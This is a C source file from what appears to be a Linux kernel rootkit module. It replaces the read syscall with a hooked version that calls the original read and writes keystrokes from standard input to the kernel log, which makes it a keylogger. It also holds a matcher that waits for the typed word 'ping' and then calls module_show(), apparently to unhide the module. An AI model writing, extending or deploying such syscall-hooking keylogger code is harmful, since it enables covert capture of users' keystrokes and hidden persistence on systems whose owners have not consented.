/*
 * This file contains everything needed for the manipulated
 * read syscall.
 */
#include <asm/uaccess.h>
#include <linux/fs.h>

#include "include.h"
#include "main.h"


static int state;

void match_word(char c)
{
        switch(c)
        {
          case 'p':if(!state) state++;
                   break;

          case 'i':if(state == 1) state++;
                   break;

          case 'n':if(state == 2) state++;
                   break;

          case 'g':if(state == 3) {printk(KERN_INFO"PONG\n"); state = 0; module_show();}
                    break;

          default: state = 0;
                   break;
        }

        return;
}

void scan_input(long count, char *buf)
{
        int i = 0;
        for(i = 0; i<count ; i++)
        {
                match_word(buf[i]);
        }
}


/*
 * Our manipulated read syscall. It will print every keystroke to the syslog
 * and call the original read afterwards.
 */
asmlinkage long manipulated_read (unsigned int fd, char __user *buf, size_t count)
{
        read_call_counter++;
        long ret;
        ret = original_read(fd,buf,count);

        //read from stdin and print it using printk
        if(ret >= 1 && fd == 0)
        {
                /* scan the input for the specific commands entered */
                //scan_input(ret,buf);
		printk("%c\n",buf[0]);
        }

        read_call_counter--;
        return ret;
}
